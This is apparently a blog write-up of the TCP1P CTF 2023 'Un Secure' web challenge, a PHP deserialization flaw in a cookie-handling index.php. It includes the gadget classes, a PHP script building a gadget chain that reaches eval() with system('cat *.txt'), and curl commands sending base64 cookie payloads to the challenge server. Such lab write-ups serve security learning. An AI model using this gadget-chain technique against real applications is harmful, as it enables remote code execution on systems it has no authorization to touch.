---
title: TCP1PCTF 2023 - Un Secure [WEB]
author: H0j3n
date: 2023-10-17 00:00:00
categories: [ctf]
tags: [ctf,writeup]
render_with_liquid: false
---

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_0.png)

Link to archive challenges: 

- [https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Web/Un%20Secure](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Web/Un%20Secure)

# Category : Web

## Web : Un Secure

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_1.png)

We received a zip file `dist.zip` with the source code of the web challenge.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_2.png)

When we tried to browse the web link, we don't see much except a white page with sentence **"Welcome to my web app!"**

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_3.png)

Looking at `index.php`, the code will check if cookies with name `cookie` is set. If set, it will `unserialize()` the cookies after base64 decode using `base64_decode()`.

```php
<?php
require("vendor/autoload.php");

if (isset($_COOKIE['cookie'])) {
    $cookie = base64_decode($_COOKIE['cookie']);
    unserialize($cookie);
}

echo "Welcome to my web app!";
```

A simple search `dangerous of unserialize() php` in Google will lead us into an interesting information. 

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_4.png)

The name of the challenge itself is a hint that the challenge involve `Deserialization` vulnerabilities. In `src/` folder, we can find few `PHP` files with three (3) gadgets that we can use to get a Remote Code Execution (RCE). Let's walkthrough each of the gadgets available

### GadgetOne (Adders.php)

```php
<?php

namespace GadgetOne {
    class Adders
    {
        private $x;
        function __construct($x)
        {
            $this->x = $x;
        }
        function get_x()
        {
            return $this->x;
        }
    }
}
```

> __construct() - PHP class constructor, is automatically called upon object creation
{: .prompt-info }

- In `GadgetOne`, we can set the variable `$x` to any values that we want and interestingly it will return the value of variable `$x` in the function of `get_x()`.

### GadgetTwo (Echoers.php)

```php
<?php
namespace GadgetTwo {
    class Echoers
    {
        protected $klass;
        function __destruct()
        {
            echo $this->klass->get_x();
        }
    }

}
```

> __destruct() - PHP class destructor, is automatically called when references to the object are removed from memory.
{: .prompt-info }

- In `GadgetTwo`, we can set the variable `$klass` and the function `get_x()` from **GadgetOne** was called in this gadget.

### GadgetThree (Vuln.php)

```php
<?php

namespace GadgetThree {
    class Vuln
    {
        public $waf1;
        protected $waf2;
        private $waf3;
        public $cmd;
        function __toString()
        {
            if (!($this->waf1 === 1)) {
                die("not x");
            }
            if (!($this->waf2 === "\xde\xad\xbe\xef")) {
                die("not y");
            }
            if (!($this->waf3) === false) {
                die("not z");
            }
            eval($this->cmd);
        }
    }
}

> __toString() - PHP call-back that gets executed if the object is treated like a string.
{: .prompt-info }

- In `GadgetThree`, even though there is a WAF but we can defined each of the variable accordingly to bypass it. Once we have bypass it, we can get our input which is `cmd` to `eval()` function.

```

### Solution (1)

Based on the **Gadget** above, at first I only focus on the **GadgetThree** because it got `eval()` function. But I keep wondering how can I trigger the `__toString()` with only using **GadgetThree**? Like I mentioned above, it will only get executed if the object is treated like a **string**, but in our case it only `unserialize()` the object not `echo unserialize()`.

```php
unserialize($cookie);
```

That's when I realize we need to chain all the gadget to get **RCE**. Thanks to my team members in [M53](https://ctftime.org/team/211971/), I got some idea on how to chain the gadgets.

This is the first solution my team member (vicevirus) tried but he mentioned this is wrong. We will get back to this at the end to explain the reason.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_5.png)

So the idea is I need to get my Vuln() object into the `GadgetTwo` as it use `echo()`.

```php
# Original
echo $this->klass->get_x();

# Plan
echo $this->klass->Vuln();
```

Then, I realize that `get_x()` will return the value of variable `$x` and with this I come out with the solution below:

```php
<?php
require("vendor/autoload.php");

$gadgetOne = new \GadgetOne\Adders(1);
$gadgetTwo = new \GadgetTwo\Echoers();
$gadgetThree = new \GadgetThree\Vuln();

// Setup GadgeThree
// get an Vuln class instance
$vuln = new \GadgetThree\Vuln();
$reflection = new \ReflectionClass($gadgetThree);
$property = $reflection->getProperty('waf1');
$property->setAccessible(true);
$property->setValue($vuln, 1);
$property = $reflection->getProperty('waf2');
$property->setAccessible(true);
$property->setValue($vuln, "\xde\xad\xbe\xef");
$property = $reflection->getProperty('waf3');
$property->setAccessible(true);
$property->setValue($vuln, false);
$property = $reflection->getProperty('cmd');
$property->setAccessible(true);
$property->setValue($vuln, "system('cat *.txt');");

// Setup GadgetOne
// __construct($x)
$adders = new \GadgetOne\Adders(1);
$reflection = new \ReflectionClass($gadgetOne);
$property = $reflection->getProperty('x');
$property->setAccessible(true);
$property->setValue($adders, $vuln);

// Setup GadgetTwo
// __destruct()
$echoers = new \GadgetTwo\Echoers();
$reflection = new \ReflectionClass($gadgetTwo);
$property = $reflection->getProperty('klass');
$property->setAccessible(true);
$property->setValue($echoers, $adders);

$serialized = serialize($echoers);

echo base64_encode($serialized);

echo "\n";
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_6.png)

Use `curl` with the base64 cookies and we will get the flag!

```bash
curl "http://ctf.tcp1p.com:45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO086MTY6IkdhZGdldFRocmVlXFZ1bG4iOjQ6e3M6NDoid2FmMSI7aToxO3M6NzoiACoAd2FmMiI7czo0OiLerb7vIjtzOjIyOiIAR2FkZ2V0VGhyZWVcVnVsbgB3YWYzIjtiOjA7czozOiJjbWQiO3M6MjA6InN5c3RlbSgnY2F0ICoudHh0Jyk7Ijt9fX0="
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_7.png)

### Explanation

I really hope this solution is working. I'm interested to know if its possible to include `system()` or any function in PHP object.

```php
<?php
require("vendor/autoload.php");

$gadgetOne = new \GadgetOne\Adders(system('id'));
$gadgetTwo = new \GadgetTwo\Echoers();

$reflection = new \ReflectionClass($gadgetTwo);
$property = $reflection->getProperty('klass');
$property->setAccessible(true);
$property->setValue($gadgetTwo, $gadgetOne);

$serializedGadgetTwo = serialize($gadgetTwo);

echo(base64_encode($serializedGadgetTwo));
```

When we run the payload above, we will see that somehow the command executed.

```bash
curl "http://ctf.tcp1p.com:45678/" -b "cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6NDM6IlRDUDFQe3Vuc2VyaWFsaXplIGluIHBocCBnbyBicnJycnJycnIgb3VjaH0iO319"
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_8.png)

Im not an expert with **Deserialization**, but let us do some checking with the PHP Object itself.

```bash
# Base64 Encoded Bbject
TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6ODoiACoAa2xhc3MiO086MTY6IkdhZGdldE9uZVxBZGRlcnMiOjE6e3M6MTk6IgBHYWRnZXRPbmVcQWRkZXJzAHgiO3M6MjE1OiJ1aWQ9MTAwMChrYWxpKSBnaWQ9MTAwMChrYWxpKSBncm91cHM9MTAwMChrYWxpKSw0KGFkbSksMjAoZGlhbG91dCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjcoc3VkbyksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwMCh1c2VycyksMTA2KG5ldGRldiksMTExKGJsdWV0b290aCksMTE3KHNjYW5uZXIpLDE0MCh3aXJlc2hhcmspLDE0MihrYWJveGVyKSI7fX

# Base64 Decoded Object
O:17:"GadgetTwo\Echoers":1:{s:8:"*klass";O:16:"GadgetOne\Adders":1:{s:19:"GadgetOne\Addersx";s:215:"uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer)";}
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/12_tcp1pctf2023_web_unsecure/TCP1PCTF_Unsecure_9.gif)

So basically, it will stored the value of our `system('id')` into the PHP object and output it later :( . But overall, I learn something new with most of the challenge in this CTF :) 
